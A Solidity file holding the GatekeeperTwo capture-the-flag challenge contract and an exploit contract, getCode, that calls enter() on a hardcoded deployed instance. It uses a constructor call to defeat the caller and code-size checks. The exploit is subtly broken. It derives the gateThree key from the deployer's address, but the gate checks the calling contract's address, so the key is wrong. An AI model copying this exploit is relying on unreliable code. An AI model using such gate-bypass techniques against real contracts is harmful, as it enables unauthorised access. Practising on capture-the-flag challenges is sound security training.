//SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) } 
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract getCode {

    constructor() {
        GatekeeperTwo gate = GatekeeperTwo(0x56C6A0Fed211166ADb12D20209B8d5733cF8490E);

        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max;
        gate.enter(bytes8(key));
    }

}